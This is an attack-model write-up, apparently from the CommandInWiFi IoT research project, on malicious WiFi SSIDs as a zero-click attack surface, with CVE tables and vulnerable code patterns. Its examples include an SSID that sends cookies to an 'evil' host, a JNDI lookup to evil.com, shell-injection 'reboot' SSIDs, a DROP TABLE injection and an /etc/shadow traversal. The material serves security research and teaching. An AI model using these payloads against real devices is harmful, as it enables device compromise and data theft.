# Attack Model WiFi SSID as a Zero-Click Attack Surface

> This document provides an in-depth technical analysis of the WiFi SSID attack surface,
> real-world CVEs, vulnerable code patterns, and how CommandInWiFi maps its 157 payloads
> to each vulnerability class.

---

## Table of Contents

- [1. The Zero-Click Attack Surface](#1-the-zero-click-attack-surface)
- [2. 802.11 Beacon Frames and SSID Parsing](#2-80211-beacon-frames-and-ssid-parsing)
- [3. Vulnerability Classes](#3-vulnerability-classes)
  - [3.1 Command Injection](#31-command-injection)
  - [3.2 Buffer Overflow](#32-buffer-overflow)
  - [3.3 Format String](#33-format-string)
  - [3.4 XSS / Web UI Injection](#34-xss--web-ui-injection)
  - [3.5 Serialization / Config Injection](#35-serialization--config-injection)
  - [3.6 CRLF / HTTP Header Injection](#36-crlf--http-header-injection)
  - [3.7 JNDI / Expression Language](#37-jndi--expression-language)
  - [3.8 Path Traversal](#38-path-traversal)
  - [3.9 NoSQL / LDAP Injection](#39-nosql--ldap-injection)
  - [3.10 Terminal Escape Injection](#310-terminal-escape-injection)
  - [3.11 Encoding Normalization](#311-encoding-normalization)
  - [3.12 Memory Corruption Primitives](#312-memory-corruption-primitives)
- [4. Daemons and Services That Parse SSIDs](#4-daemons-and-services-that-parse-ssids)
- [5. Detection Methodology](#5-detection-methodology)
- [6. Real-World CVE Reference Table](#6-real-world-cve-reference-table)
- [7. Academic Research and Further Reading](#7-academic-research-and-further-reading)

---

## 1. The Zero-Click Attack Surface

Every WiFi-enabled device runs a background service that **continuously scans for nearby networks and parses SSID strings without any user interaction**. This is not optional behavior - it is fundamental to how WiFi works.

```
    Attacker (ESP32)                          Target Device
    ┌──────────────┐                     ┌─────────────────────┐
    │              │   802.11 Beacon     │   WiFi Daemon       │
    │  Broadcasts  │ ──────────────────> │   (wpa_supplicant,  │
    │  Malicious   │   Every ~100ms      │    NetworkManager,  │
    │  SSID        │                     │    wifid, wappd)    │
    │              │   No authentication │                     │
    │              │   No connection     │   Parses SSID       │
    │              │   No user action    │   from beacon IE    │
    └──────────────┘                     └────────┬────────────┘
                                                  │
                                    ┌─────────────┴──────────────┐
                                    │                            │
                              ┌─────▼─────┐              ┌──────▼──────┐
                              │ Stored in │              │ Passed to   │
                              │ config/DB │              │ system(),   │
                              │ or log    │              │ printf(),   │
                              │           │              │ HTML render │
                              └───────────┘              └─────────────┘
```

**Why this is zero-click:**

1. WiFi scanning is automatic - daemons scan every few seconds
2. Beacon frames are broadcast - no association or authentication required
3. The SSID string is extracted and processed before any user sees it
4. If the processing code has a flaw, exploitation happens during parsing

This is the same attack class behind:
- **WiFiDemon (iOS)** - format string in `wifid` during auto-join scan
- **Marvell Avastar** - heap overflow during 5-minute periodic scan
- **Broadpwn (Broadcom)** - heap overflow during passive beacon processing
- **CVE-2024-30078 (Windows)** - stack overflow in WiFi driver management frame parsing

---

## 2. 802.11 Beacon Frames and SSID Parsing

### Beacon Frame Structure

```
802.11 Beacon Frame
├── MAC Header (24 bytes)
│   ├── Frame Control: Type=0 (Management), Subtype=8 (Beacon)
│   ├── Duration
│   ├── Destination: FF:FF:FF:FF:FF:FF (broadcast)
│   ├── Source: AP MAC address
│   ├── BSSID: AP MAC address
│   └── Sequence Control
│
├── Frame Body
│   ├── Fixed Fields (12 bytes)
│   │   ├── Timestamp (8 bytes)
│   │   ├── Beacon Interval (2 bytes, typically 100 TU = ~102.4ms)
│   │   └── Capability Information (2 bytes)
│   │
│   └── Tagged Parameters (variable)
│       ├── SSID Information Element    ◄── ATTACK SURFACE
│       ├── Supported Rates IE
│       ├── DS Parameter Set IE
│       ├── TIM IE
│       └── ... additional IEs
│
└── FCS (4 bytes)
```

### SSID Information Element (IE)

```
┌────────────┬────────────┬──────────────────────────┐
│ Element ID │   Length   │      SSID String         │
│  (1 byte)  │  (1 byte)  │     (0-32 bytes)         │
│   0x00     │   0-32     │   arbitrary octets       │
└────────────┴────────────┴──────────────────────────┘
```

**Critical implementation detail:** The Length field is 8 bits, allowing values 0-255. The IEEE 802.11 standard limits SSIDs to 32 bytes, but **many implementations trust the raw length field** without validating against the 32-byte maximum. This single design gap is responsible for numerous buffer overflow CVEs (CVE-2015-1863, CVE-2022-23088, CVE-2017-9417).

**The SSID is NOT:**
- Null-terminated (it's a length-prefixed byte array)
- Required to be valid ASCII or UTF-8
- Sanitized or validated at the protocol level
- Authenticated (any device can broadcast any SSID)

---

## 3. Vulnerability Classes

### 3.1 Command Injection

**Likelihood: High.** Multiple confirmed CVEs. Common in embedded Linux firmware that wraps WiFi utilities via shell calls.

**How it works:** The SSID string reaches a shell execution function (`system()`, `popen()`, `exec()`) without sanitization. Shell metacharacters in the SSID (`|`, `;`, `` ` ``, `$()`) are interpreted as command operators.

**Vulnerable code pattern:**

```c
// Target firmware - SSID reaches shell unsanitized
char cmd[128];
snprintf(cmd, sizeof(cmd), "iwconfig wlan0 essid %s", ssid);
system(cmd);
// ssid = "|reboot|"
// executes: iwconfig wlan0 essid |reboot|
// the pipe operator causes "reboot" to execute as a separate command
```

```python
# Python-based IoT service
os.popen(f"nmcli dev wifi connect '{ssid}'")
# ssid = "'; reboot; '"
# executes: nmcli dev wifi connect ''; reboot; ''
```

**Real-world CVEs:**

| CVE | Device | Details |
|-----|--------|---------|
| CVE-2023-45208 | D-Link DAP-X1860 | Single tick `'` in SSID breaks shell quoting in `libcgifunc.so`, commands run as root |
| CVE-2017-2915 | Circle with Disney | SSID parsed by `parse_ap_list` passed to `system()` - 8 injectable characters |
| CVE-2017-12094 | Circle with Disney | WiFi channel from SSID used in unsanitized `sed` command |
| CVE-2023-42810 | Node.js `systeminformation` | SSID injection in `wifiConnections()` - CVSS 9.8 |

**CommandInWiFi payloads:** `wifi_cmd` category (25 payloads) - pipe operators, backtick substitution, subshell `$()`, semicolons, IFS bypass, BusyBox-specific, PowerShell, null byte truncation.

---

### 3.2 Buffer Overflow

**Likelihood: High.** Most common WiFi vulnerability class — responsible for the majority of WiFi chip/driver CVEs.

**How it works:** Firmware allocates a fixed-size buffer for the SSID (commonly 32, 33, 64, or 128 bytes) and copies the SSID into it without checking length. Since the SSID IE length field allows up to 255 bytes, an oversized SSID overflows the buffer.

**Vulnerable code pattern:**

```c
// Tenda router firmware - stack buffer overflow
void fast_setting_wifi_set(char *ssid) {
    char buf[64];
    sprintf(buf, "iwpriv ra0 set SSID=%s", ssid);  // no length check
    // 128-byte SSID overflows 64-byte stack buffer
}
```

```c
// wpa_supplicant P2P - heap buffer overflow (CVE-2015-1863)
struct p2p_device {
    // ...
    char ssid[32];  // 32-byte buffer
    // ...
};
// P2P SSID IE length field = 255 → memcpy copies 255 bytes into 32-byte buffer
// overflow of 223 bytes corrupts adjacent heap metadata
```

**Real-world CVEs:**

| CVE | Component | Buffer | Overflow | Impact |
|-----|-----------|--------|----------|--------|
| CVE-2015-1863 | wpa_supplicant P2P | 32 bytes | 223 bytes | Heap corruption, code execution |
| CVE-2022-23088 | FreeBSD kernel 802.11 | Heap | Arbitrary | Kernel backdoor via Mesh ID IE |
| CVE-2017-9417 | Broadcom BCM43xx | 44 bytes | 211 bytes | WiFi chip firmware takeover |
| CVE-2024-30078 | Windows WiFi driver | Stack | Arbitrary | Remote code execution, CVSS 8.8 |
| CVE-2024-20017 | MediaTek wappd | Heap | Arbitrary | Zero-click RCE, CVSS 9.8 |
| CVE-2020-9395 | Realtek RTL8195A | Stack | Arbitrary | WiFi module takeover without password |
| CVE-2025-3328 | Tenda AC1206 | Stack | Arbitrary | System compromise via SSID parameter |

**CommandInWiFi payloads:** `wifi_overflow` category (26 payloads) - 32-byte boundary fills, 64-byte buffer fills, 128-byte buffer fills, off-by-one (33 and 65 bytes), null-terminated boundaries, CRLF at boundary, canary detection, overflow+format hybrids.

**Why 64 and 128 byte payloads:** Many embedded C firmwares use `char ssid[64]` or `char buf[128]` for SSID storage. The IEEE 802.11 32-byte limit is at the protocol level, but internal buffers are often power-of-two sized. Testing at these boundaries catches different allocator and compiler alignment bugs.

**Current limitation:** The ESP firmware uses `WiFi.softAP()`, which enforces the 32-byte SSID limit — payloads longer than 32 bytes are truncated by the WiFi driver. To broadcast oversized SSIDs, raw beacon frame injection via `esp_wifi_80211_tx()` is required (crafting the 802.11 frame with a Length field > 32 in the SSID IE). The >32-byte payloads are included in the database for future raw-frame firmware support and for reference when testing via other injection methods.

---

### 3.3 Format String

**Likelihood: Medium-High.** Proven by WiFiDemon (iOS CVE-2021-30800). Less common than buffer overflows but devastating when present.

**How it works:** The SSID is passed directly as the format string argument to `printf()`, `syslog()`, `NSLog()`, or similar functions. Format specifiers in the SSID (`%s`, `%x`, `%n`) are interpreted, causing memory reads, writes, or crashes.

**Vulnerable code pattern:**

```c
// VULNERABLE - SSID is the format string
syslog(LOG_INFO, ssid);     // ssid = "%s%s%s%s" → crash
printf(ssid);               // ssid = "%n%n%n%n" → memory write

// SAFE - SSID is an argument
syslog(LOG_INFO, "%s", ssid);
printf("%s", ssid);
```

**Real-world CVE:**

| CVE | Device | Details |
|-----|--------|---------|
| CVE-2021-30800 | iOS (wifid daemon) | SSID `%p%s%s%s%s%n` crashes WiFi. The `%@` specifier (Objective-C) triggers use-after-free enabling **zero-click RCE**. Silently patched in iOS 14.4 (RCE), iOS 14.7 (DoS). |

**Why this is critical:** The iOS WiFiDemon vulnerability proves that a **32-byte SSID is enough for full remote code execution** via format string. The `%@` Objective-C format specifier is only 2 bytes, leaving 30 bytes for payload construction.

**CommandInWiFi payloads:** `wifi_fmt` category (15 payloads) - `%s` crash chains, `%n` write exploits, `%x`/`%p` stack leak, positional parameters (`%1$n`), width overflow (`%.9999d`), stack canary probes.

---

### 3.4 XSS / Web UI Injection

**Likelihood: Medium-High.** Multiple confirmed CVEs across router vendors. Any IoT device with a web-based "Site Survey" page is a potential target.

**How it works:** IoT devices with web administration interfaces display nearby WiFi networks in a "Site Survey" or "Wireless Networks" page. If the SSID is rendered in HTML without escaping, JavaScript in the SSID executes in the admin's browser session.

**Vulnerable code pattern:**

```html
<!-- Router admin page - Site Survey -->
<table>
  <tr><td><!-- SSID inserted here without escaping --></td></tr>
  <!-- If SSID = <script>alert(1)</script> → XSS -->
</table>
```

**Real-world CVEs:**

| CVE/Advisory | Device | Details |
|-----|--------|---------|
| (no CVE assigned) | DD-WRT | Site Survey page renders beacon SSIDs without escaping. Admin session hijack. |
| (no CVE assigned) | BT Home Hub | SSIDs at `/cgi/b/_wds_/cfg/` rendered unsanitized. JavaScript with admin privileges. |
| CVE-2022-30329 | Trendnet TEW-831DR | Nearby network SSIDs displayed without sanitization. |
| CVE-2025-25427 | TP-Link WR841N | XSS via SSID in router web interface. |

**Attack flow:**

```
Attacker broadcasts SSID: <script>fetch('//evil/'+document.cookie)</script>
                    │
                    ▼
Router admin opens "Site Survey" page
                    │
                    ▼
SSID rendered as HTML → JavaScript executes with admin session
                    │
                    ▼
Admin cookies exfiltrated / router config changed / firmware replaced
```

**CommandInWiFi payloads:** `wifi_xss` category (8 payloads) - `<script>`, `<img onerror>`, `<svg onload>`, `<details ontoggle>`, `<iframe>`, JS string breakout, `<marquee onstart>`.

---

### 3.5 Serialization / Config Injection

**How it works:** IoT firmware stores scanned or connected SSIDs in configuration files (JSON, XML, INI, SQLite). If the SSID is written without escaping, it can break the file structure and inject new keys, values, or SQL statements.

**Vulnerable code pattern:**

```python
# IoT config storage - JSON injection
config = f'{{"ssid": "{ssid}", "connected": true}}'
# ssid = '","admin":true,"x":"'
# result: {"ssid": "","admin":true,"x":"", "connected": true}
# attacker injects admin=true
```

```c
// SQLite SSID storage - SQL injection
char query[256];
sprintf(query, "INSERT INTO wifi_history (ssid) VALUES ('%s')", ssid);
sqlite3_exec(db, query, NULL, NULL, NULL);
// ssid = "'; DROP TABLE wifi_history;--"
```

**CommandInWiFi payloads:** `wifi_serial` category (13 payloads) - JSON key injection, XML tag escape, SQLite injection, JSON privilege escalation, INI newline injection, Jinja/ERB/SSTI template injection, Excel formula/DDE injection, YAML deserialization, PHP object injection.

---

### 3.6 CRLF / HTTP Header Injection

**How it works:** IoT web interfaces that reflect the SSID in HTTP responses (captive portals, status pages) may not strip carriage return / line feed characters. CRLF in the SSID injects arbitrary HTTP headers or splits the response to inject body content.

**Vulnerable code pattern:**

```python
# Captive portal - SSID reflected in response header
response.headers["X-Current-Network"] = ssid
# ssid = "\r\nSet-Cookie: admin=true"
# injects a Set-Cookie header into the response
```

**CommandInWiFi payloads:** `wifi_crlf` category (6 payloads) - header injection, cookie injection, redirect injection, response splitting, request smuggling prefix, Content-Length injection.

---

### 3.7 JNDI / Expression Language

**Likelihood: Low-Medium.** Applies primarily to enterprise-grade APs and Java-based IoT gateways. Consumer IoT devices rarely run Java. Included because Log4Shell demonstrated that *any* logged string can be an attack vector, and enterprise WiFi management platforms (Cisco, Aruba, Ruckus) do log SSIDs.

**How it works:** Java-based IoT platforms (Android Things, SmartThings hubs, enterprise APs) that log SSIDs using Log4j or similar frameworks may evaluate expression language in the SSID string. The Log4Shell vulnerability (CVE-2021-44228) demonstrated that `${jndi:ldap://...}` in a logged string triggers remote class loading.

**Attack scenario:**

```
SSID: ${jndi:ldap://evil.com/payload}
              │
              ▼
Java IoT platform logs SSID via Log4j
              │
              ▼
Log4j evaluates ${jndi:...} → connects to attacker LDAP server
              │
              ▼
Attacker serves malicious Java class → RCE on target
```

**CommandInWiFi payloads:** `wifi_jndi` category (6 payloads) - LDAP/DNS/RMI JNDI lookups, environment variable leak, system property leak, polyglot template probe.

---

### 3.8 Path Traversal

**Likelihood: Low.** Requires firmware that uses the SSID directly as a filename or path component — uncommon but not impossible in custom IoT firmware that logs WiFi scan results to per-network files.

**How it works:** Firmware that stores SSID scan history or logs on the filesystem may use the SSID as part of a file path. Directory traversal sequences (`../`) in the SSID can escape the intended directory.

**Vulnerable code pattern:**

```python
# IoT firmware - WiFi scan log storage
log_path = f"/var/log/wifi/{ssid}.log"
with open(log_path, 'w') as f:
    f.write(scan_data)
# ssid = "../../../etc/shadow"
# writes to /etc/shadow instead of /var/log/wifi/
```

**CommandInWiFi payloads:** `wifi_path` category (6 payloads) - Linux/Windows traversal, URL-encoded slash, double-dot bypass, `/proc/self/environ` leak, device file DoS.

---

### 3.9 NoSQL / LDAP Injection

**Likelihood: Low.** Primarily targets enterprise network appliances and cloud-connected IoT gateways that store WiFi metadata in NoSQL databases or authenticate via LDAP. Rare in consumer devices but present in enterprise WiFi management systems.

**How it works:** IoT devices using MongoDB or LDAP for network management may query using SSID values. MongoDB operator injection (`$gt`, `$ne`, `$regex`) or LDAP filter injection can bypass authentication or leak data.

**CommandInWiFi payloads:** `wifi_nosql` category (6 payloads) - MongoDB operator bypass, regex match-all, server-side JS eval, LDAP wildcard/password filter injection.

---

### 3.10 Terminal Escape Injection

**How it works:** SSIDs logged to serial consoles, syslog, or terminal emulators may contain ANSI escape sequences. These can clear the screen, hide text, inject fake log entries, or trigger terminal-specific vulnerabilities like cursor position reporting (which injects characters into stdin).

**CommandInWiFi payloads:** `wifi_esc` category (8 payloads) - screen clear, terminal title change, cursor position report (stdin injection), alt screen buffer, colored fake log entries, log line overwrite, hidden text mode.

---

### 3.11 Encoding Normalization

**How it works:** Unicode fullwidth characters visually resemble ASCII but have different codepoints. If a filter blocks ASCII shell metacharacters but the backend normalizes Unicode to ASCII (NFKC/NFKD), fullwidth versions bypass the filter and become dangerous after normalization.

**Example:** `\uff04` (fullwidth `$`) → normalized to `$` → `$(reboot)` executes.

**CommandInWiFi payloads:** `wifi_enc` category (8 payloads) - fullwidth `$`, `|`, `;`, URL-encoded pipe/subshell, JSON Unicode escapes, HTML entities, overlong UTF-8.

---

### 3.12 Memory Corruption Primitives

**How it works:** Specific byte patterns target heap allocator metadata (dlmalloc/newlib used by ESP, FreeRTOS), stack canaries, or memory initialization markers. Unlike generic fuzzing, these patterns are crafted to trigger specific allocator behaviors.

**CommandInWiFi payloads:** `wifi_heap` category (8 payloads) - dlmalloc prev_size overwrite, fake chunk headers, `0xDEADBEEF` canary probe, `INT_MAX` spray, `0xBAADF00D` uninitialized marker, null sled + address overwrite.

---

## 4. Daemons and Services That Parse SSIDs

The SSID attack surface exists because multiple layers of software process the SSID string, each with potential vulnerabilities:

| Service | Platform | Role | Known CVEs |
|---------|----------|------|------------|
| **wpa_supplicant** | Linux, Android | WPA/WPA2 supplicant, SSID parsing, P2P | CVE-2015-1863 (P2P SSID heap overflow) |
| **hostapd** | Linux | AP mode daemon | Multiple (see [w1.fi/security](https://w1.fi/security/)) |
| **NetworkManager** | Linux (GNOME) | Network management, D-Bus interface | Inherits wpa_supplicant bugs |
| **iwd** | Linux (Intel) | Modern supplicant replacement | Newer, smaller attack surface |
| **wifid** | iOS | WiFi management daemon | CVE-2021-30800 (format string RCE) |
| **wappd** | MediaTek chipsets | Hotspot 2.0 / IAPP daemon | CVE-2024-20017 (zero-click OOB write) |
| **Vendor web UIs** | Routers, APs | Admin interface, Site Survey | DD-WRT XSS, BT Home Hub XSS, Trendnet XSS |
| **Kernel WiFi drivers** | Windows, FreeBSD, Linux | 802.11 frame parsing | CVE-2024-30078, CVE-2022-23088 |
| **WiFi chip firmware** | Broadcom, Qualcomm, Realtek, Marvell | On-chip beacon processing | CVE-2017-9417, CVE-2019-6496, CVE-2020-9395 |

**Key insight:** The SSID is processed at multiple levels - chip firmware, kernel driver, userspace daemon, web UI. A vulnerability at **any** level creates an attack path. CommandInWiFi payloads are designed to reach all of them.

---

## 5. Detection Methodology

CommandInWiFi uses **behavioral black-box detection** - observing target device reactions externally without requiring root access, JTAG, or serial console on the target.

### Phase 1: Behavioral Detection (This Framework)

```
┌─────────────────────────────────────────────────────┐
│                  DETECTION SIGNALS                  │
├──────────────────┬──────────────────────────────────┤
│ Signal           │ What it indicates                │
├──────────────────┼──────────────────────────────────┤
│ Quick disconnect │ Device crashes processing SSID   │
│ (< 10 seconds)  │ after connecting to AP            │
├──────────────────┼──────────────────────────────────┤
│ Probe lost       │ Device stopped probing after SSID │
│ (ESP32 only)     │ change - scan-time crash         │
├──────────────────┼──────────────────────────────────┤
│ Reconnect after  │ Device rebooted and reconnected  │
│ disconnect       │ - confirms crash + auto-recovery │
├──────────────────┼──────────────────────────────────┤
│ Behavioral       │ If SSID = |reboot| and device    │
│ correlation      │ reboots - confirmed cmd execution │
└──────────────────┴──────────────────────────────────┘
```

**Why behavioral, not debugger-based:**
- You typically don't have shell/JTAG access to the target IoT device
- You can't attach GDB to a smart doorbell, router, or camera
- The device under test is a black box - behavior is the only observable
- This mirrors real-world attack scenarios where the attacker has no device access

### Phase 2: Root Cause Analysis (Separate)

Once a triggering SSID is identified via behavioral detection, root cause analysis is performed separately:

| Method | When available | What it reveals |
|--------|---------------|-----------------|
| Device logs (`/var/log/syslog`, `dmesg`) | If you have shell access | Crash stack trace, faulting function |
| Kernel debug (`kdump`, `crashdump`) | If kernel debug is enabled | Exact crash location, register state |
| JTAG / SWD | If hardware debug port exposed | Real-time memory inspection, breakpoints |
| Firmware reverse engineering | Always (dump flash) | Vulnerable function, code path to shell |
| Serial console | If UART pins accessible | Boot logs, crash output |

**CommandInWiFi covers Phase 1. Phase 2 is device-specific and typically done under controlled research conditions.**

---

## 6. Real-World CVE Reference Table

### SSID-Specific Vulnerabilities

| CVE | Year | Device | Class | CVSS | Zero-Click |
|-----|------|--------|-------|------|------------|
| CVE-2021-30800 | 2021 | iOS (wifid) | Format String + UAF | High | Yes (auto-join scan) |
| CVE-2023-45208 | 2023 | D-Link DAP-X1860 | Command Injection | High | During network setup |
| CVE-2017-2915 | 2017 | Circle with Disney | Command Injection | High | During WiFi scan |
| CVE-2017-12094 | 2017 | Circle with Disney | Command Injection | High | During WiFi scan |
| CVE-2023-42810 | 2023 | Node.js systeminformation | Command Injection | 9.8 | When app scans WiFi |
| CVE-2015-1863 | 2015 | wpa_supplicant | Heap Overflow (P2P) | High | During P2P scan |
| CVE-2022-30329 | 2022 | Trendnet TEW-831DR | XSS via SSID | Medium | Admin views scan |
| CVE-2025-25427 | 2025 | TP-Link WR841N | XSS via SSID | Medium | Admin views scan |
| CVE-2025-3328 | 2025 | Tenda AC1206 | Buffer Overflow | High | During WiFi setup |

### WiFi Chip/Driver Firmware (Zero-Click)

| CVE | Year | Chip/Driver | Class | CVSS | Affected Devices |
|-----|------|-------------|-------|------|------------------|
| CVE-2017-9417 | 2017 | Broadcom BCM43xx | Heap Overflow | Critical | Millions of Android/iOS devices |
| CVE-2019-6496 | 2019 | Marvell Avastar | Block Pool Overflow | High | PS4, Xbox, Surface, Galaxy J1 |
| CVE-2020-9395 | 2020 | Realtek RTL8195A | Stack Overflow | Critical | IoT WiFi modules |
| CVE-2024-20017 | 2024 | MediaTek MT7622/7915 | OOB Write | 9.8 | Ubiquiti, Xiaomi, Netgear |
| CVE-2024-30078 | 2024 | Windows WiFi drivers | Stack Overflow | 8.8 | All Windows 10/11/Server |
| CVE-2022-23088 | 2022 | FreeBSD kernel 802.11 | Heap Overflow | Critical | pfSense, OPNsense |

### Protocol-Level

| CVE | Year | Scope | Class | Details |
|-----|------|-------|-------|---------|
| CVE-2023-52424 | 2024 | IEEE 802.11 (all) | SSID Confusion | SSID not authenticated in PMK derivation |
| CVE-2020-24588 | 2021 | IEEE 802.11 (all) | FragAttacks | Frame aggregation/fragmentation flaws |

---

## 7. Academic Research and Further Reading

### Key Papers

| Paper | Authors | Venue | Relevance |
|-------|---------|-------|-----------|
| Over The Air: Exploiting Broadcom's Wi-Fi Stack | Google Project Zero | 2017 | Full beacon-to-RCE chain on WiFi chip firmware |
| Fragment and Forge: Breaking WiFi Through Frame Aggregation and Fragmentation | Mathy Vanhoef | USENIX Security 2021 | 12 vulnerabilities in all WiFi devices since 1997 |
| SSID Confusion: Making Wi-Fi Clients Connect to the Wrong Network | Mathy Vanhoef | WiSec 2024 | Protocol-level SSID authentication flaw |
| The SSID Stripping Vulnerability | AirEye + Technion | 2021 | Visual spoofing via NULL bytes and non-printable chars |
| WiFi Spoofing: Employing RLO to SSID Stripping | AirEye | 2022 | Right-to-Left Override Unicode for SSID display manipulation |
| Revisiting Realtek: Critical WiFi Vulnerabilities by Automated Zero-Day Analysis | JFrog | 2021 | Automated stack overflow discovery in WiFi module firmware |

### Advisories and Writeups

- [wpa_supplicant P2P SSID overflow (w1.fi)](https://w1.fi/security/2015-1/wpa_supplicant-p2p-ssid-overflow.txt)
- [WiFiDemon iOS analysis (Jamf)](https://www.jamf.com/blog/meet-wifidemon-ios-wifi-rce-0-day-vulnerability-and-a-zero-click-vulnerability-that-was-silently-patched/)
- [D-Link DAP-X1860 SSID injection (RedTeam Pentesting)](https://www.redteam-pentesting.de/en/advisories/rt-sa-2023-006/)
- [FreeBSD WiFi heap overflow (ZDI)](https://www.thezdi.com/blog/2022/6/15/cve-2022-23088-exploiting-a-heap-overflow-in-the-freebsd-wi-fi-stack)
- [MediaTek CVE-2024-20017 (SonicWall)](https://blog.sonicwall.com/en-us/2024/09/critical-exploit-in-mediatek-wi-fi-chipsets-zero-click-vulnerability-cve-2024-20017-threatens-routers-and-smartphones/)
- [Windows CVE-2024-30078 analysis (CYFIRMA)](https://www.cyfirma.com/research/cve-2024-30078-remote-code-execution-vulnerability-analysis-and-exploitation/)
- [DD-WRT SSID script injection (WithSecure)](https://labs.withsecure.com/advisories/dd-wrt-ssid-script-injection-vulnerability)
- [BT Home Hub SSID script injection (WithSecure)](https://labs.withsecure.com/advisories/bt-home-hub-ssid-script-injection-vulnerability)
- [Trendnet router CVEs (NCC Group)](https://www.nccgroup.com/research-blog/technical-advisory-multiple-vulnerabilities-in-trendnet-tew-831dr-wifi-router-cve-2022-30325-cve-2022-30326-cve-2022-30327-cve-2022-30328-cve-2022-30329/)
- [Broadpwn writeup (Exodus Intelligence)](https://blog.exodusintel.com/2017/07/26/broadpwn/)
- [Realtek RTL8195A vulnerabilities (Vdoo/JFrog)](https://www.vdoo.com/blog/realtek-rtl8195a-vulnerabilities-discovered/)
- [CAPEC-67: Format String in syslog() (MITRE)](https://capec.mitre.org/data/definitions/67.html)

---

*This document is part of the [CommandInWiFi](https://github.com/V33RU/CommandInWiFi-Zeroclick) project - a zero-click SSID command injection testing framework for IoT security research.*
